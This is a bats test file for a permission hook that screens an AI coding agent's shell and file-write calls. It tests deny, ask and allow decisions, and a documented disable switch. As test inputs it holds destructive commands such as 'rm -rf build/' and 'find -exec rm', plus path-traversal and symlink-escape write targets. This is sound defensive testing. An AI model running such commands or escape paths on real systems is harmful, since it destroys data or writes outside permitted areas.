#!/usr/bin/env bats

# Tests for the PreToolUse hook at .claude/hooks/gdd-permission-hook.sh.
#
# Coverage:
#   - Tier 1: deny shell composition (each operator) with specific reason
#   - Tier 2: redirect-deny for raw commands with a `ws` wrapper
#   - Tier 3: adapter-aware deny/nudge for raw test/lint runners
#   - Tier 4: ask-tier — destructive commands matching [ask-commands]
#   - Tier 5: allow via project .claude/settings.json
#       - bare command vs verbose pattern (symmetric normalization)
#       - verbose command vs bare pattern (symmetric normalization)
#       - CRLF line endings in settings.json don't break matching
#   - Tier 6: allow via [allow-extras] section of hook-rules.local
#   - legacy safe-bash-extras file is ignored (no longer consulted)
#   - Passthrough: no match → exit 0 with no JSON
#   - WS_HOOK_DISABLE bypass
#   - Timeout safety: no infinite loops on Windows-style absolute paths
#
# `run_hook` wraps the hook in `timeout 10` so a future regression
# that hangs the upward-walk loop fails the test instead of stalling
# the suite.

load test_helper

setup() {
    init_hook_env
}

# ─── Tier 1: shell composition deny ─────────────────────────────────

@test "deny: && triggers shell-composition message" {
    run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "deny: || triggers shell-composition message" {
    run_hook "ls || pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "deny: ; triggers shell-composition message" {
    run_hook "ls ; pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "deny: | triggers pipes message" {
    run_hook "ls -la | head"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Pipes"* ]]
}

@test "deny: grep with | redirects to Grep tool (specific message)" {
    # Common false-positive case: regex alternation contains a literal
    # | inside the quoted pattern. The hook can't distinguish that
    # from a shell pipe, but it CAN recognize that the right answer
    # for any grep-with-| invocation is to use the Grep tool.
    run_hook 'grep -E "a|b" file.txt'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Grep tool"* ]]
    [[ "$output" != *"Pipes"* ]]
}

@test "deny: cmd | grep also redirects to Grep tool when cmd starts with grep" {
    # This case is grep ... | something — still starts with `grep `,
    # so the redirect arm fires (correctly, since the user should use
    # the Grep tool here too).
    run_hook "grep foo file | head"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Grep tool"* ]]
}

@test "deny: non-grep cmd | grep falls through to generic pipes message" {
    # `cat file | grep pattern` starts with `cat`, not `grep`, so the
    # grep-specific arm doesn't fire. Generic pipes deny still applies.
    run_hook "cat file | grep pattern"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Pipes"* ]]
}

@test "deny: backticks trigger command-substitution message" {
    run_hook 'echo `date`'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Command substitution"* ]]
}

@test "deny: \$() triggers command-substitution message" {
    run_hook 'echo $(date)'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Command substitution"* ]]
}

@test "deny: > triggers redirection message" {
    run_hook "echo hi > /tmp/file"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"redirection"* ]]
}

@test "deny: < triggers redirection message" {
    run_hook "cat < /tmp/file"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"redirection"* ]]
}

@test "deny: 2>&1 FD merge gets specific 'not needed' message" {
    # The Bash tool captures both stdout and stderr natively, so
    # `2>&1` is cargo-cult shell jargon. Deny with a message that
    # explains the redundancy — saves newbies from learning FD-merge
    # syntax just to follow transcripts.
    run_hook "ls 2>&1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"File-descriptor merges"* ]]
    [[ "$output" != *"Output / input redirection"* ]]
}

@test "deny: 1>&2 FD merge gets the same message" {
    run_hook "echo error 1>&2"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"File-descriptor merges"* ]]
}

@test "deny: grep with > redirect hits redirect message, not grep arm bypass" {
    # Regression: an earlier ordering of the Tier 1 case statement put
    # the `grep ` arm right after the composition arm. The inner
    # `case` inside that arm only matched `|`, so a command like
    # `grep foo file > out` matched the outer grep arm, hit nothing
    # inside, and silently fell through — bypassing the redirect deny.
    # Fix was to reorder: the more-specific redirect / substitution /
    # FD-merge arms now precede the grep arm.
    run_hook "grep foo file > out"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"redirection"* ]]
    [[ "$output" != *"Grep tool"* ]]
}

@test "deny: grep with backtick command substitution hits substitution message" {
    # Same regression class as the redirect case: grep with substitution
    # must be caught by the substitution arm, not silently pass through
    # the grep arm.
    run_hook 'grep `whoami` file'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Command substitution"* ]]
}

@test "deny: newline-separated commands trigger newline-list message" {
    # Embedded \n is a command separator in bash (a literal newline
    # in a command string runs whatever follows as a fresh command).
    # Same threat as `;`, but visually invisible — caught here so it
    # can't slip past the other Tier 1 arms via creative whitespace.
    run_hook $'ls\npwd'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Newline-separated"* ]]
}

@test "deny: single & background separator triggers background-separator message" {
    # `cmd1 & cmd2` runs cmd1 in background and cmd2 right after.
    # Two commands per invocation, both invisible to per-call audit.
    # The arm sits after `>&N` (FD merge) so `2>&1` still hits the
    # more-specific FD-merge message, but bare `&` is denied.
    run_hook "sleep 1 & echo done"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Background separator"* ]]
}

@test "deny: shell-composition message does NOT contain literal backslash escapes" {
    # An earlier version wrote `\&\&` inside the double-quoted deny
    # string, which appeared verbatim to the agent (the backslash
    # isn't an escape for `&` in bash double-quoted strings).
    # Make sure the message reads naturally now.
    run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\\&\\&"* ]]
    [[ "$output" == *"(&&,"* ]]
}

@test "deny: combined real redirect + FD merge hits FD message first" {
    # The FD-merge arm comes before the general redirect arm in the
    # case statement. A command containing both (`cmd 2>&1 > file`)
    # matches the FD-merge arm first. Either deny is fine — both
    # are correct — but pin the order so the user always sees the
    # more specific corrective message when both apply.
    run_hook "cmd 2>&1 > output.log"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"File-descriptor merges"* ]]
}

# ─── Tier 5: symmetric normalization against settings.json ──────────

@test "allow via settings: bare command matches verbose pattern" {
    write_project_settings 'Bash(bash scripts/ws status)'
    run_hook "ws status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via settings: verbose command matches bare pattern" {
    write_project_settings 'Bash(ws status)'
    run_hook "bash scripts/ws status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via settings: wildcard pattern matches args" {
    write_project_settings 'Bash(ws hoard upgrade *)'
    run_hook "ws hoard upgrade borgr"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via settings: CRLF line endings don't break matching" {
    # Write the settings file with explicit CRLF endings to simulate
    # autocrlf=true on Windows. The hook must strip the trailing \r
    # before pattern comparison or the `)` close-paren strip silently
    # fails, leaving `)` in the pattern and breaking every match.
    {
        printf '{\r\n'
        printf '  "permissions": {\r\n'
        printf '    "allow": [\r\n'
        printf '      "Bash(ws status)"\r\n'
        printf '    ]\r\n'
        printf '  }\r\n'
        printf '}\r\n'
    } > "$WORK/.claude/settings.json"

    run_hook "ws status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Tier 6: [allow-extras] from hook-rules.local ───────────────────

@test "allow via allow-extras: pattern from hook-rules.local [allow-extras] matches" {
    write_project_hook_rules ""
    write_local_hook_rules "[allow-extras]
figlet *"
    run_hook "figlet hello"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via allow-extras: hook-rules.local walks up from a nested cwd" {
    # Put hook-rules.local at the project root, run with cwd nested inside.
    write_project_hook_rules ""
    write_local_hook_rules "[allow-extras]
figlet *"
    mkdir -p "$WORK/subdir/deeper"
    run_hook "figlet hello" "$WORK/subdir/deeper"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Malformed settings.json doesn't crash the hook ────────────────

@test "malformed settings.json: hook continues to passthrough (no script crash)" {
    # Regression: the script runs under `set -euo pipefail`. Before the
    # `jq empty` parse-check guard, a corrupted .claude/settings.json
    # would make jq exit non-zero, abort the script mid-walk, and the
    # harness would see a hook crash on every Bash call. Now the file
    # is skipped on parse failure; the hook keeps walking.
    printf '%s\n' '{ this is not valid json' > "$WORK/.claude/settings.json"
    run_hook "npm install some-package"
    [ "$status" -eq 0 ]
    # Passthrough — no allow/deny decision should be emitted.
    [[ "$output" != *"permissionDecision"* ]]
}

# ─── Audit-log injection safety ─────────────────────────────────────

@test "audit log: command with embedded newline does NOT split entry across lines" {
    # Regression: without the audit_safe newline-escape, a command
    # containing $'\n' would split a single audit entry across
    # multiple lines, breaking the one-entry-per-line shape that
    # `tail -100`, grep, and the housekeeping skill assume.
    #
    # Test the safety property (single-line integrity + content
    # preserved), not the exact escape sequence — the latter is an
    # implementation detail that bash pattern-matching makes
    # awkward to assert anyway (a `\` inside `[[ ... == *pat* ]]`
    # is treated as a glob escape and silently consumed).
    run_hook $'ls\npwd'
    [ "$status" -eq 0 ]
    log="$HOME/.claude/hook-audit.log"
    [ -f "$log" ]
    # Exactly one log line. Without escape this would be 2 (the
    # embedded newline would start a new awk record mid-entry).
    line_count="$(awk 'END{print NR}' "$log")"
    [ "$line_count" = "1" ]
    # Both halves of the original command appear in the single
    # entry — the escape doesn't drop content, just flattens the
    # separator.
    log_content="$(cat "$log")"
    [[ "$log_content" == *ls* ]]
    [[ "$log_content" == *pwd* ]]
}

# ─── Edit/Write scratch-dir branch ──────────────────────────────────

@test "Edit/Write: write into a scratch dir auto-allows" {
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Write" ".tmp/draft.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "Edit/Write: write outside scratch dirs passes through" {
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Write" "src/main.rs"
    [ "$status" -eq 0 ]
    # No scratch-dir match → passthrough, harness prompts.
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: path traversal out of a scratch dir does NOT auto-allow" {
    # Regression: the scratch-dir test is a textual prefix match, so
    # `.tmp/../../escape` still STARTS WITH `<project>/.tmp/` and
    # would wrongly auto-allow a write that RESOLVES outside the
    # project. The `..`-segment guard rejects it to passthrough.
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Write" ".tmp/../../escape.txt"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: a bare .. component does not auto-allow" {
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Edit" "../outside.txt"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: a symlink dir escaping a scratch dir does not auto-allow" {
    # `.tmp/evil` is a symlink to a dir OUTSIDE the project. A write
    # to `.tmp/evil/passwd` has a literal path under `.tmp/`, but its
    # physical resolution lands outside — the symlink guard catches it.
    #
    # Verify the link with `-L`, not `ln -s`'s exit code: Git Bash on
    # Windows returns 0 from `ln -s` but silently creates a real copy
    # when symlink privileges are absent. Skip cleanly in that case.
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    mkdir -p "$WORK/.tmp"
    mkdir -p "$BATS_TEST_TMPDIR/outside"
    ln -s "$BATS_TEST_TMPDIR/outside" "$WORK/.tmp/evil" 2>/dev/null || true
    [[ -L "$WORK/.tmp/evil" ]] || skip "real symlinks not supported on this platform"
    run_hook_write "Write" ".tmp/evil/passwd"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: a symlinked target file in a scratch dir does not auto-allow" {
    # The target itself is a symlink — a write follows it wherever it
    # points. The `-L` check rejects it before the prefix match.
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    mkdir -p "$WORK/.tmp"
    ln -s "$BATS_TEST_TMPDIR/secret.txt" "$WORK/.tmp/sneaky.txt" 2>/dev/null || true
    [[ -L "$WORK/.tmp/sneaky.txt" ]] || skip "real symlinks not supported on this platform"
    run_hook_write "Write" ".tmp/sneaky.txt"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "scratch: a config-only scratch dir auto-allows Edit" {
    write_project_hook_rules "[scratch-dirs]
.myscratch/"
    run_hook_write "Edit" ".myscratch/note.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "scratch: a dir NOT in config does not auto-allow" {
    write_project_hook_rules "[scratch-dirs]
.tmp/"
    run_hook_write "Edit" ".notscratch/note.md"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Passthrough ────────────────────────────────────────────────────

@test "passthrough: unmatched command yields no decision" {
    run_hook "npm install some-package"
    [ "$status" -eq 0 ]
    # No JSON output → harness's normal flow takes over
    [[ "$output" != *"permissionDecision"* ]]
}

# ─── WS_HOOK_DISABLE bypass ─────────────────────────────────────────

@test "WS_HOOK_DISABLE: skips all checks, including Tier 1 deny" {
    # Even a compound command should pass through when the env var
    # is set. The bypass is the user's escape hatch for sessions
    # where they don't want the hook active at all.
    WS_HOOK_DISABLE=1 run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "WS_HOOK_DISABLE=0 does NOT bypass (treats as opt-in, not boolean)" {
    # An earlier version used a non-empty check that meant
    # WS_HOOK_DISABLE=0 also disabled the hook — the opposite of
    # every other env-var-flag convention and a foot-gun for users
    # exporting WS_HOOK_DISABLE=0 thinking they're explicitly
    # turning it off. The fix is an explicit `== "1"` comparison.
    WS_HOOK_DISABLE=0 run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "WS_HOOK_DISABLE='' does NOT bypass" {
    # Empty string from `export WS_HOOK_DISABLE=` should NOT bypass —
    # only an explicit `=1` opts out.
    WS_HOOK_DISABLE='' run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

# ─── Timeout-safe upward walk ───────────────────────────────────────

@test "timeout safety: Windows-style cwd doesn't hang the upward walk" {
    # The original bug: dirname of "D:/foo/bar" eventually returns "."
    # and `dirname .` returns "." forever. The hook's prev-equals-dir
    # guard exits the loop. This test confirms the guard works: a
    # Windows-style cwd completes within the 10s timeout in run_hook.
    write_project_settings 'Bash(ws status)'
    run_hook "ws status" "D:/Dev/GitWS/yggdrasil"
    [ "$status" -eq 0 ]
    # Exit status 124 would mean timeout — anything else means the
    # walk terminated. The output may or may not be "allow" depending
    # on whether the Windows path actually exists as a project root.
    # The key assertion is that we DIDN'T hit the timeout.
    [ "$status" -ne 124 ]
}

# ─── Tier 4: ask-list ───────────────────────────────────────────────

@test "ask: rm -rf matches the baseline ask-list and emits ask" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    run_hook "rm -rf build/"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: rm-family ask reason carries the symlink caution" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    run_hook "rm -rf build/"
    [ "$status" -eq 0 ]
    [[ "$output" == *"symlinks"* ]]
}

@test "ask: non-rm ask reason has no symlink caution" {
    write_project_hook_rules "[ask-commands]
git reset --hard*"
    run_hook "git reset --hard HEAD~1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" != *"symlinks"* ]]
}

@test "ask: ws exec matches the baseline ask-list and emits ask" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "ws exec yggdrasil git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: bash scripts/ws exec normalizes to the ws exec ask-list entry" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "bash scripts/ws exec yggdrasil git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: ws exec ask-list entry matches many command arguments" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "ws exec yggdrasil printf %s a b c d e f g h"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: ws hook-bypass gets a tailored message naming the slug + reason" {
    write_project_hook_rules "[ask-commands]
ws hook-bypass [a-z]*"
    run_hook 'ws hook-bypass git-commit --reason "amend last commit"'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"git-commit"* ]]
    [[ "$output" == *"amend last commit"* ]]
    # NOT the generic destructive-command message
    [[ "$output" != *"destructive or hard to undo"* ]]
}

@test "ask: ws hook-bypass without --reason surfaces (none)" {
    write_project_hook_rules "[ask-commands]
ws hook-bypass [a-z]*"
    run_hook "ws hook-bypass git-push"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"git-push"* ]]
    [[ "$output" == *"(none)"* ]]
}

@test "ask: ws hook-bypass supports the --reason=<value> form" {
    write_project_hook_rules "[ask-commands]
ws hook-bypass [a-z]*"
    run_hook "ws hook-bypass git-commit --reason=amend-last-commit"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"git-commit"* ]]
    [[ "$output" == *"amend-last-commit"* ]]
    [[ "$output" != *"destructive or hard to undo"* ]]
}

@test "ask: ws hook-bypass message names the raw command pattern, not just the slug" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
[ask-commands]
ws hook-bypass [a-z]*
EOF
)"
    run_hook "ws hook-bypass git-commit"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    # The slug is named AND the raw command pattern it maps to is surfaced,
    # so the human isn't told the slug 'git-commit' is itself the command.
    [[ "$output" == *"git-commit"* ]]
    [[ "$output" == *"git commit*"* ]]
}

@test "ask: Tier 1 composition denies before the ask-tier is reached" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    run_hook "rm -rf build/ && echo done"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: hook-rules.local ask-command is additive (also asks)" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    write_local_hook_rules "[ask-commands]
shutdown*"
    run_hook "shutdown now"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: a malformed hook-rules (entry before any section) degrades, no crash" {
    write_project_hook_rules "rm -rf*
[ask-commands]
rm -rf*"
    run_hook "ls"
    [ "$status" -eq 0 ]
    # Degraded: the malformed file is skipped, so no rules load and the
    # unrelated command gets no hook decision at all (passthrough).
    [[ "$output" != *"permissionDecision"* ]]
}

@test "ask: no hook-rules file present → no ask, passthrough still works" {
    run_hook "rm -rf build/"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
}

# ─── Tier 6 vs legacy safe-bash-extras ──────────────────────────────

@test "allow-extras: a hook-rules.local [allow-extras] pattern allows" {
    write_project_hook_rules ""
    write_local_hook_rules "[allow-extras]
sl *"
    run_hook "sl -e"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow-extras: a legacy safe-bash-extras file is ignored" {
    write_project_extras "sl *"
    run_hook "sl -e"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow-extras: an [allow-extras] section in the committed hook-rules is ignored" {
    write_project_hook_rules "[allow-extras]
sl *"
    run_hook "sl -e"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "ask: git -C <path> reset --hard matches the broadened git ask-pattern" {
    write_project_hook_rules "[ask-commands]
git*reset --hard*"
    run_hook "git -C /some/repo reset --hard HEAD"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

# ─── ws review side-effect ask entries ──────────────────────────────
#
# With the review allowlist collapsed to Bash(ws review:*), the
# outward-facing forms (reply posts to the PR; --resolve mutates
# thread state) are kept human-gated via the ask-list, which runs
# BEFORE the settings-allow tier. Read-only review stays frictionless.

@test "ask: ws review reply forces a prompt despite the review:* allow" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * reply *"
    run_hook 'ws review yggdrasil reply 94 PRRT_x "done, thanks" --resolve'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: verbose ws review reply normalizes then asks" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * reply *"
    run_hook 'bash scripts/ws review yggdrasil reply 94 PRRT_x msg --resolve'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: ws review threads --resolve-all forces a prompt" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * threads * --resolve*"
    run_hook 'ws review yggdrasil threads 94 --resolve-all'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: read-only ws review does NOT trip the side-effect ask entries" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * reply *
ws review * threads * --resolve*"
    run_hook 'ws review yggdrasil 94 --compact'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "ask: read-only threads --status does NOT trip the resolve ask entry" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * threads * --resolve*"
    run_hook 'ws review yggdrasil threads 94 --status'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Drift detection ────────────────────────────────────────────────

@test "drift: hook-rules [scratch-dirs] stays in sync with .gitignore" {
    # Scratch entries declared in .gitignore, between the sentinel
    # markers, with the leading '/' stripped, sorted.
    local gitignore_dirs
    gitignore_dirs=$(awk '/^# >>> scratch-dirs/{f=1; next} /^# <<< scratch-dirs/{f=0} f' \
        "$REPO_ROOT/.gitignore" | sed 's:^/::' | sort)

    # Scratch entries declared in hook-rules [scratch-dirs], comments
    # and blank lines dropped, sorted.
    local hookrules_dirs
    hookrules_dirs=$(awk '/^\[scratch-dirs\]/{f=1; next} /^\[/{f=0} f' \
        "$REPO_ROOT/.claude/hooks/hook-rules" \
        | grep -v '^[[:space:]]*#' | grep -v '^[[:space:]]*$' | sort)

    if [ -z "$gitignore_dirs" ]; then
        echo "drift test: extracted no scratch-dirs from .gitignore — sentinel markers missing or renamed?"
        return 1
    fi
    if [ -z "$hookrules_dirs" ]; then
        echo "drift test: extracted no entries from hook-rules [scratch-dirs] — section header missing or renamed?"
        return 1
    fi

    if [ "$gitignore_dirs" != "$hookrules_dirs" ]; then
        echo "scratch-dir drift between .gitignore and hook-rules:"
        echo "--- .gitignore ---"
        echo "$gitignore_dirs"
        echo "--- hook-rules [scratch-dirs] ---"
        echo "$hookrules_dirs"
        return 1
    fi
}

@test "drift: committed ask-list force-prompts ws exec" {
    local ask_entries
    ask_entries=$(awk '/^\[ask-commands\]/{f=1; next} /^\[/{f=0} f' \
        "$REPO_ROOT/.claude/hooks/hook-rules" \
        | grep -v '^[[:space:]]*#' | grep -v '^[[:space:]]*$')

    if ! grep -Fxq 'ws exec *' <<< "$ask_entries"; then
        echo "hook-rules [ask-commands] must include: ws exec *"
        echo "--- hook-rules [ask-commands] ---"
        echo "$ask_entries"
        return 1
    fi
}

@test "ask: find -exec matches the broadened find ask-pattern" {
    write_project_hook_rules "[ask-commands]
find*-exec*"
    run_hook "find . -type f -exec rm {} +"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

# ─── Tier 2 redirect-deny — parser ──────────────────────────────────

@test "redirect: malformed [redirect-commands] entry (2 columns) is skipped with warning" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
malformed-entry | only-two-columns
git-commit | git commit* | Use ws commit
EOF
)"
    run_hook "git commit -m x"
    [ "$status" -eq 0 ]
    # Well-formed entry still fires
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws commit"* ]]
    # Malformed entry triggers a warning in the audit log
    grep -q "WARNING.*malformed \[redirect-commands\] entry" "$HOME/.claude/hook-audit.log"
}

@test "redirect: malformed slug (uppercase / underscore) is skipped" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git_commit | git commit* | bad slug, should skip
git-commit | git commit* | Use ws commit
EOF
)"
    run_hook "git commit -m x"
    [ "$status" -eq 0 ]
    [[ "$output" == *"Use ws commit"* ]]
    [[ "$output" != *"bad slug"* ]]
}

# ─── Tier 2 redirect-deny — evaluation ──────────────────────────────

@test "redirect: git commit denies with ws commit suggestion" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use `ws commit <comp> <bodyfile>` — handles Co-Authored-By trailer + bodyfile-driven staging.
git-push | git push* | Use `ws push <comp> [branch]` — handles fork-remote selection.
gh-pr-create | gh pr create* | Use `ws cr <comp> <title> <bodyfile>` — bodyfile-driven.
EOF
)"
    run_hook 'git commit -m "fix bug"'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use \`ws commit"* ]]
}

@test "redirect: git push denies with ws push suggestion" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-push | git push* | Use ws push
gh-pr-create | gh pr create* | Use ws cr
EOF
)"
    run_hook "git push origin feature/x"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws push"* ]]
}

@test "redirect: gh pr create denies with ws cr suggestion" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-push | git push* | Use ws push
gh-pr-create | gh pr create* | Use ws cr
EOF
)"
    run_hook "gh pr create --title x --body y"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws cr"* ]]
}

@test "redirect: composition wins over redirect (T1 before T2)" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    run_hook 'git commit -m x && git push'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
    [[ "$output" != *"Use ws commit"* ]]
}

@test "redirect: git mv denies with plain-mv + bodyfile guidance" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-mv | git mv* | Use plain mv then list both paths in the ws commit bodyfile
EOF
)"
    run_hook "git mv old.md new.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"list both paths"* ]]
}

@test "redirect: git-mv glob does not over-match 'mv' in other git args" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-mv | git mv* | Use plain mv then list both paths in the ws commit bodyfile
EOF
)"
    # A non-mv subcommand whose args merely contain " mv " must NOT be denied
    # as git-mv (the bare `git mv*` pattern is start-anchored, not a catch-all).
    run_hook 'git tag -a v1 -m "drop the old mv helper"'
    [ "$status" -eq 0 ]
    [[ "$output" != *"list both paths"* ]]
}

